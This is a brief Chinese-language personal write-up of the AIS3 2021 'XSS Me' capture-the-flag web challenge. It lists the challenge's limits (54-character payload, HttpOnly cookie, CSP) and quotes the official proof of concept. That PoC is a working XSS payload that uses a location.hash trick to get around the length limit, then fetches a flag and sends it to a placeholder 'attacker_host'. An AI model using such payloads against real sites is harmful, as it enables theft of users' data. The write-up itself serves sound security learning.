# Web4  XSS Me
原本看到題目超級興奮，是常找的XSS
結果 😧
> 我到現在還沒寫出來，等Writeup
> [06/02] 令人驚艷那解實在太漂亮

https://github.com/splitline/My-CTF-Challenges/tree/master/ais3-pre-exam/2021/Web/xss-me

## 限制
* payload只能54個字元 ✅
* Cookie設定了HttpOnly => document.cookie拿不到內容 （官版Writeup似乎沒提到，不過是對的
* CSP策略：default-src: 'self' ...忘了 => 不能載入外部src✅
* 在<script>裏面，所以要閉合✅
  
## 官版POC
```js
</script><script>location=location.hash.slice(1)//
#javascript:fetch('/getflag').then(function(r){return/**/r.text()}).then(function(r){location='http://attacker_host/'+r})
```

## 問題
我主要就是差在「繞過字元長度限制」這一步  
以後知道了啦，有弄hash這招可以解  
沒有仔細去想有可能繞過的解，導致一直卡在思考「54個字元怎麼寫」的死循環  
不過大推這題，真的讚  
  
  
